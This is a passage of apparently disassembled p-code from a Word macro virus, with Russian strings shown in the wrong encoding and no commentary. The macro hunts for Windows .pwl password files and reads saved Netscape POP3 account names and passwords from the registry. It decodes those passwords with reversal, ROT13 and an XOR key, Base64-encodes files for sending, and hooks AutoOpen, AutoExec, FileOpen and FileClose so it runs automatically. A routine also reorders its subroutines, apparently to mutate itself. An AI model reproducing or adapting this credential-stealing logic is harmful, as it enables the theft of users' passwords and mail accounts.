' 	LitDI2 0x0000 
' 	St LowMask 
' Line #86:
' 	LitDI2 0x0004 
' 	St HiShift 
' Line #87:
' 	LitDI2 0x0040 
' 	St LowShift 
' Line #88:
' 	ElseBlock 
' Line #89:
' 	Ld HiMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	Paren 
' 	Ld HiMask 
' 	And 
' 	Paren 
' 	LitDI2 0x0004 
' 	Div 
' 	St HiMask 
' Line #90:
' 	LitDI2 0x003F 
' 	Ld HiMask 
' 	Xor 
' 	St LowMask 
' Line #91:
' 	Ld HiShift 
' 	LitDI2 0x0004 
' 	Mul 
' 	St HiShift 
' Line #92:
' 	Ld LowShift 
' 	LitDI2 0x0004 
' 	Div 
' 	St LowShift 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Next 
' Line #96:
' 	Ld Resalt 
' 	St Decode_ 
' Line #97:
' 	EndFunc 
' Line #98:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #99:
' 	FuncDefn (Function FindPWL(j As Integer, FindFiles As ))
' Line #100:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #101:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #102:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #103:
' 	ExitFunc 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	LitDI2 0x0000 
' 	St j 
' Line #106:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #107:
' 	Ld Dir 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #108:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #109:
' 	Loop 
' Line #110:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #111:
' 	LitDI2 0x0000 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #112:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #113:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #114:
' 	Ld Dir$ 
' 	Ld j 
' 	ArgsSt FindFiles 0x0001 
' Line #115:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #116:
' 	ElseBlock 
' Line #117:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	EndFunc 
' Line #120:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #121:
' 	FuncDefn (Function Grab_Registr_main())
' Line #122:
' 	Dim 
' 	VarDefn res (As Long)
' 	VarDefn hkey (As Long)
' 	VarDefn i (As Long)
' Line #123:
' 	Dim 
' 	VarDefn KeyName (As String)
' 	VarDefn KeyLen (As Long)
' Line #124:
' 	Dim 
' 	VarDefn ClassName (As String)
' 	VarDefn ClassLen (As Long)
' Line #125:
' 	Dim 
' 	VarDefn lastwrite
' Line #126:
' 	Dim 
' 	VarDefn res1 (As Long)
' 	VarDefn hkey1 (As Long)
' 	VarDefn n (As Long)
' Line #127:
' 	Dim 
' 	VarDefn KeyName1 (As String)
' 	VarDefn KeyLen1 (As Long)
' Line #128:
' 	Dim 
' 	VarDefn ClassName1 (As String)
' 	VarDefn ClassLen1 (As Long)
' Line #129:
' 	Dim 
' 	VarDefn lastwrite1
' Line #130:
' 	Dim 
' 	VarDefn userName (As String)
' Line #131:
' 	Dim 
' 	VarDefn PassWord (As String)
' Line #132:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #133:
' 	Dim 
' 	VarDefn Version (As String)
' Line #134:
' 	Dim 
' 	VarDefn j (As Long)
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	LitStr 0x0000 ""
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #137:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x0030 "Software\Netscape\Netscape Navigator\biff\users\"
' 	LitDI2 0x0000 
' 	LitHI2 0x0008 
' 	Ld hkey 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	St res 
' Line #138:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #139:
' 	LitStr 0x004E "Íà ìàøèíå íå óñòàíîâëåíà ïð. Netscape Navigator (èëè íåïîääåðæèâàåìàÿ âåðñèÿ)."
' 	St Resalt 
' Line #140:
' 	Ld Resalt 
' 	St Grab_Registr_main 
' Line #141:
' 	ExitFunc 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	LitDI2 0x0000 
' 	St i 
' Line #144:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #145:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St KeyName 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St ClassName 
' Line #146:
' 	LitDI2 0x00FF 
' 	St KeyLen 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	St ClassLen 
' Line #147:
' 	Ld hkey 
' 	Ld i 
' 	Ld KeyName 
' 	Ld KeyLen 
' 	LitDI2 0x0000 
' 	ParamByVal 
' 	Ld ClassName 
' 	Ld ClassLen 
' 	Ld lastwrite 
' 	ArgsLd RegEnumKeyEx 0x0008 
' 	St res 
' Line #148:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #149:
' 	Ld KeyName 
' 	Ld KeyLen 
' 	ArgsLd LBound 0x0002 
' 	St KeyName 
' Line #150:
' 	Ld ClassName 
' 	Ld ClassLen 
' 	ArgsLd LBound 0x0002 
' 	St ClassName 
' Line #151:
' Line #152:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x0030 "Software\Netscape\Netscape Navigator\biff\users\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0009 "\servers\"
' 	Add 
' 	LitDI2 0x0000 
' 	LitHI2 0x0008 
' 	Ld hkey1 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	St res1 
' Line #153:
' 	LitDI2 0x0000 
' 	St n 
' Line #154:
' 	Ld res1 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #155:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St KeyName1 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St ClassName1 
' Line #156:
' 	LitDI2 0x00FF 
' 	St KeyLen1 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	St ClassLen1 
' 	QuoteRem 0x0021 0x0000 ""
' Line #157:
' 	Ld hkey1 
' 	Ld n 
' 	Ld KeyName1 
' 	Ld KeyLen1 
' 	LitDI2 0x0000 
' 	ParamByVal 
' 	Ld ClassName1 
' 	Ld ClassLen1 
' 	Ld lastwrite1 
' 	ArgsLd RegEnumKeyEx 0x0008 
' 	St res1 
' Line #158:
' 	Ld res1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #159:
' 	Ld KeyName1 
' 	Ld KeyLen1 
' 	ArgsLd LBound 0x0002 
' 	St KeyName1 
' Line #160:
' 	Ld ClassName1 
' 	Ld ClassLen1 
' 	ArgsLd LBound 0x0002 
' 	St ClassName1 
' Line #161:
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0009 "\servers\"
' 	Add 
' 	Ld KeyName1 
' 	Add 
' 	LitStr 0x0008 "userName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St userName 
' Line #162:
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0009 "\servers\"
' 	Add 
' 	Ld KeyName1 
' 	Add 
' 	LitStr 0x0008 "password"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St PassWord 
' Line #163:
' 	LineCont 0x000C 08 00 01 00 15 00 01 00 1E 00 01 00
' 	Ld Resalt 
' 	LitStr 0x000E "Ïîëüçîâàòåëü: "
' 	Add 
' 	Ld KeyName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "POP3-ñåðâåð: "
' 	Add 
' 	Ld KeyName1 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "Èìÿ Àêêàóíòà äëÿ POP3-ñåðâåðà: "
' 	Add 
' 	Ld userName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld PassWord 
' 	ArgsLd Decode_Password 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #166:
' 	Loop 
' Line #167:
' 	Ld hkey1 
' 	ArgsLd RegCloseKey 0x0001 
' 	St res1 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #170:
' 	Ld j 
' 	Ld n 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	St j 
' Line #171:
' 	ArgsCall DoEvents 0x0000 
' Line #172:
' 	Loop 
' Line #173:
' 	Ld hkey 
' 	ArgsLd RegCloseKey 0x0001 
' 	St res 
' Line #174:
' 	LitStr 0x0000 ""
' 	LitStr 0x0037 "HKEY_LOCAL_MACHINE\Software\Netscape\Netscape Navigator"
' 	LitStr 0x000E "CurrentVersion"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Version 
' Line #175:
' 	LitStr 0x0045 "*ïðîãðàììà òåñòèðîâàíà òîëüêî äëÿ âåðñèè Netscape Navigator 4.51(ru)*"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001B "Ó Âàñ Netscape Navigator - "
' 	Add 
' 	Ld Version 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Ïîëüçîâàòåëåé - "
' 	Add 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "Ïî÷òîâûõ Àêêàóíòîâ - "
' 	Add 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld Resalt 
' 	Add 
' 	St Resalt 
' Line #176:
' 	Ld Resalt 
' 	St Grab_Registr_main 
' Line #177:
' 	EndFunc 
' Line #178:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #179:
' 	FuncDefn (Sub Tmsn())
' Line #180:
' 	Dim 
' 	VarDefn Delta (As Integer)
' Line #181:
' 	Dim 
' 	VarDefn Old (As Byte)
' Line #182:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #183:
' 	Ld Friend 
' 	St NF 
' Line #184:
' 	OnError (Resume Next) 
' Line #185:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #186:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld Old 
' 	GetRec 
' Line #187:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #188:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St Delta 
' Line #189:
' 	Ld Delta 
' 	Ld Old 
' 	Sub 
' 	St Delta 
' Line #190:
' 	Ld Delta 
' 	SelectCase 
' Line #191:
' 	LitDI2 0x0002 
' 	CaseGt 
' 	CaseDone 
' Line #192:
' 	ArgsCall Sender 0x0000 
' Line #193:
' 	LitDI2 0x0000 
' 	Ld Delta 
' 	LitDI2 0x001F 
' 	Add 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	CaseLt 
' 	CaseDone 
' Line #194:
' 	ArgsCall Sender 0x0000 
' Line #195:
' 	CaseElse 
' Line #196:
' 	EndSelect 
' Line #197:
' 	EndSub 
' Line #198:
' 	FuncDefn (Function Base64(FName As String))
' Line #199:
' 	Dim 
' 	VarDefn i (As Long)
' Line #200:
' 	Dim 
' 	VarDefn ABC (As String)
' Line #201:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #202:
' 	Dim 
' 	VarDefn Char (As Byte)
' Line #203:
' 	Dim 
' 	VarDefn Cod (As Integer)
' Line #204:
' 	Dim 
' 	VarDefn Roll (As Integer)
' Line #205:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #206:
' 	QuoteRem 0x0000 0x0000 ""
' Line #207:
' 	Dim 
' 	VarDefn HMask (As Integer)
' Line #208:
' 	Dim 
' 	VarDefn LMask (As Integer)
' Line #209:
' 	Dim 
' 	VarDefn Shift (As Integer)
' Line #210:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #211:
' Line #212:
' Line #213:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #214:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #215:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #216:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #217:
' 	LitDI2 0x0001 
' 	St Counter 
' Line #218:
' 	LitStr 0x0040 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
' 	St ABC 
' Line #219:
' 	Ld Friend 
' 	St NF 
' Line #220:
' 	OnError (Resume Next) 
' Line #221:
' 	LitStr 0x000B "c:\windows\"
' 	Ld FName 
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #222:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NF 
' 	ArgsLd LOF 0x0001 
' 	For 
' Line #223:
' 	Ld NF 
' 	Sharp 
' 	Ld Counter 
' 	Ld Char 
' 	GetRec 
' Line #224:
' 	Ld Char 
' 	Ld HMask 
' 	And 
' 	Paren 
' 	Ld LMask 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	IDiv 
' 	Paren 
' 	Ld Roll 
' 	Or 
' 	St Cod 
' Line #225:
' 	Ld Char 
' 	Ld LMask 
' 	And 
' 	Paren 
' 	Ld Shift 
' 	Mul 
' 	St Roll 
' Line #226:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Cod 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #227:
' 	Ld HMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x00FF 
' 	And 
' 	St HMask 
' Line #228:
' 	Ld LMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	St LMask 
' Line #229:
' 	Ld Shift 
' 	LitDI2 0x0004 
' 	IDiv 
' 	St Shift 
' Line #230:
' 	Ld HMask 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #231:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #232:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #233:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #234:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #235:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #236:
' 	EndIfBlock 
' Line #237:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #238:
' 	StartForVariable 
' 	Next 
' Line #239:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #240:
' 	Ld Shift 
' 	LitDI2 0x0010 
' 	Lt 
' 	IfBlock 
' Line #241:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	Ld Tmp 
' 	FnLen 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Paren 
' 	St Cod 
' Line #244:
' 	Ld Cod 
' 	IfBlock 
' Line #245:
' 	Ld Tmp 
' 	LitDI2 0x0004 
' 	Ld Cod 
' 	Sub 
' 	LitStr 0x0001 "="
' 	ArgsLd String$$ 0x0002 
' 	Add 
' 	St Tmp 
' Line #246:
' 	EndIfBlock 
' Line #247:
' 	Ld Tmp 
' 	St Base64 
' Line #248:
' 	EndFunc 
' Line #249:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #250:
' 	FuncDefn (Sub FileClose())
' Line #251:
' 	OnError (Resume Next) 
' Line #252:
' 	ArgsCall AutoOpen 0x0000 
' Line #253:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #254:
' 	EndSub 
' Line #255:
' 	FuncDefn (Function ROT_13(Cod As String))
' Line #256:
' 	Dim 
' 	VarDefn La (As String)
' Line #257:
' 	Dim 
' 	VarDefn Smol (As String)
' Line #258:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #259:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #260:
' 	Dim 
' 	VarDefn Char (As String)
' Line #261:
' 	Dim 
' 	VarDefn ChNumber (As Integer)
' Line #262:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #263:
' 	LitStr 0x001A "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
' 	St La 
' Line #264:
' 	LitStr 0x001A "abcdefghijklmnopqrstuvwxyz"
' 	St Smol 
' Line #265:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #266:
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Char 
' Line #267:
' 	LitDI2 0x0001 
' 	Ld La 
' 	Ld Char 
' 	Ld vbBinaryCompare 
' 	FnInStr4 
' 	St ChNumber 
' Line #268:
' 	Ld ChNumber 
' 	SelectCase 
' Line #269:
' 	LitDI2 0x0001 
' 	LitDI2 0x000D 
' 	CaseTo 
' 	CaseDone 
' Line #270:
' 	Ld Tmp 
' 	Ld La 
' 	Ld ChNumber 
' 	LitDI2 0x000D 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #271:
' 	LitDI2 0x000D 
' 	CaseGt 
' 	CaseDone 
' Line #272:
' 	Ld Tmp 
' 	Ld La 
' 	Ld ChNumber 
' 	LitDI2 0x000D 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #273:
' 	CaseElse 
' Line #274:
' 	LitDI2 0x0001 
' 	Ld Smol 
' 	Ld Char 
' 	Ld vbBinaryCompare 
' 	FnInStr4 
' 	St ChNumber 
' Line #275:
' 	Ld ChNumber 
' 	SelectCase 
' Line #276:
' 	LitDI2 0x0001 
' 	LitDI2 0x000D 
' 	CaseTo 
' 	CaseDone 
' Line #277:
' 	Ld Tmp 
' 	Ld Smol 
' 	Ld ChNumber 
' 	LitDI2 0x000D 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #278:
' 	LitDI2 0x000D 
' 	CaseGt 
' 	CaseDone 
' Line #279:
' 	Ld Tmp 
' 	Ld Smol 
' 	Ld ChNumber 
' 	LitDI2 0x000D 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #280:
' 	CaseElse 
' Line #281:
' 	Ld Tmp 
' 	Ld Char 
' 	Add 
' 	St Tmp 
' Line #282:
' 	EndSelect 
' Line #283:
' 	EndSelect 
' Line #284:
' 	StartForVariable 
' 	Next 
' Line #285:
' 	Ld Tmp 
' 	St ROT_13 
' Line #286:
' 	EndFunc 
' Line #287:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #288:
' 	FuncDefn (Sub FileOpen())
' Line #289:
' 	OnError (Resume Next) 
' Line #290:
' 	ArgsCall AutoOpen 0x0000 
' Line #291:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #292:
' 	ArgsCall Sender_main 0x0000 
' Line #293:
' 	EndSub 
' Line #294:
' 	FuncDefn (Function morf(MyString As String))
' Line #295:
' 	Dim 
' 	VarDefn NextSub (As Long)
' Line #296:
' 	Dim 
' 	VarDefn Counter (As Integer)
' Line #297:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #298:
' 	Dim 
' 	VarDefn Code_ (As String)
' Line #299:
' 	Dim 
' 	VarDefn i (As Long)
' Line #300:
' 	Dim 
' 	VarDefn Pre_ (As Long)
' Line #301:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #302:
' 	OnError (Resume Next) 
' Line #303:
' 	LitDI2 0x0001 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #304:
' 	Ld NextSub 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #305:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #306:
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #307:
' 	Loop 
' Line #308:
' 	LitDI2 0x0000 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim Code_ 0x0001 (As Variant)
' Line #309:
' Line #310:
' 	LitDI2 0x0008 
' 	UMi 
' 	St NextSub 
' Line #311:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #312:
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	St Pre_ 
' Line #313:
' 	Ld Pre_ 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #314:
' 	Ld MyString 
' 	Ld Pre_ 
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	Ld Pre_ 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld i 
' 	ArgsSt Code_ 0x0001 
' Line #315:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #316:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #317:
' 	LitDI2 0x0000 
' 	ArgsLd Code_ 0x0001 
' 	St Resalt 
' Line #318:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #319:
' 	Ld Resalt 
' 	Ld i 
' 	ArgsLd A 0x0001 
' 	ArgsLd Code_ 0x0001 
' 	Add 
' 	St Resalt 
' Line #320:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #321:
' 	Ld Resalt 
' 	St morf 
' Line #322:
' 	EndFunc 
' Line #323:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #324:
' 	FuncDefn (Function Decode_Password(Cod As String))
' Line #325:
' 	Dim 
' 	VarDefn Key (As Variant)
' Line #326:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #327:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #328:
' 	Dim 
' 	VarDefn Title (As String)
' Line #329:
' 	Ld Cod 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #330:
' 	LitStr 0x0028 "Äàííûé ïîëüçîâàòåëü íå óñòàíîâèë ôëàæîê "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Çàïîìíèòü ïàðîëü"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Title 
' Line #331:
' 	Ld Title 
' 	St Decode_Password 
' Line #332:
' 	ExitFunc 
' Line #333:
' 	EndIfBlock 
' Line #334:
' 	LitDI2 0x0056 
' 	LitDI2 0x00C9 
' 	LitDI2 0x00EF 
' 	LitDI2 0x004A 
' 	LitDI2 0x009B 
' 	LitDI2 0x00BE 
' 	LitDI2 0x005A 
' 	LitDI2 0x0042 
' 	LitDI2 0x0077 
' 	LitDI2 0x0002 
' 	LitDI2 0x0043 
' 	LitDI2 0x0018 
' 	LitDI2 0x0070 
' 	LitDI2 0x0030 
' 	LitDI2 0x0089 
' 	LitDI2 0x004C 
' 	ArgsArray Array 0x0010 
' 	St Key 
' Line #335:
' 	Ld Cod 
' 	ArgsLd Revers 0x0001 
' 	St Cod 
' Line #336:
' 	Ld Cod 
' 	ArgsLd ROT_13 0x0001 
' 	St Cod 
' Line #337:
' 	Ld Cod 
' 	ArgsLd Decode_ 0x0001 
' 	St Cod 
' Line #338:
' 	Ld Cod 
' 	FnLen 
' 	St n 
' Line #339:
' 	Ld n 
' 	LitDI2 0x0010 
' 	Gt 
' 	IfBlock 
' Line #340:
' 	LitDI2 0x0010 
' 	St n 
' Line #341:
' 	LitStr 0x0024 "Ïåðâûå øåñòíàäöàòü ñèìâîëîâ ïàðîëÿ: "
' 	St Title 
' Line #342:
' 	ElseBlock 
' Line #343:
' 	LitStr 0x0008 "Ïàðîëü: "
' 	St Title 
' Line #344:
' 	EndIfBlock 
' Line #345:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld n 
' 	For 
' Line #346:
' 	Ld Title 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Key 0x0001 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Title 
' Line #347:
' 	StartForVariable 
' 	Next 
' Line #348:
' 	Ld Title 
' 	St Decode_Password 
' Line #349:
' 	EndFunc 
' Line #350:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #351:
' 	FuncDefn (Sub Sender())
' Line #352:
' 	Dim 
' 	VarDefn i (As Long)
' Line #353:
' 	LitDI2 0x0000 
' 	St i 
' Line #354:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #355:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #356:
' 	ArgsCall Sender_main 0x0000 
' Line #357:
' 	ExitSub 
' Line #358:
' 	ElseBlock 
' Line #359:
' 	LitDI2 0x00FE 
' 	ArgsCall Pause 0x0001 
' Line #360:
' 	EndIfBlock 
' Line #361:
' 	StartForVariable 
' 	Next 
' Line #362:
' 	EndSub 
' Line #363:
' 	FuncDefn (Sub AutoExec())
' Line #364:
' 	ArgsCall AutoOpen 0x0000 
' Line #365:
' 	EndSub 
' Line #366:
' 	FuncDefn (Sub Filler(MessStr As String, hwnd As Long))
' Line #367:
' 	Dim 
' 	VarDefn i (As Long)
' Line #368:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #369:
' 	Dim 
' 	VarDefn Charset (As Long)
' Line #370:
' 	OnError (Resume Next) 
' Line #371:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MessStr 
' 	FnLen 
' 	For 
' Line #372:
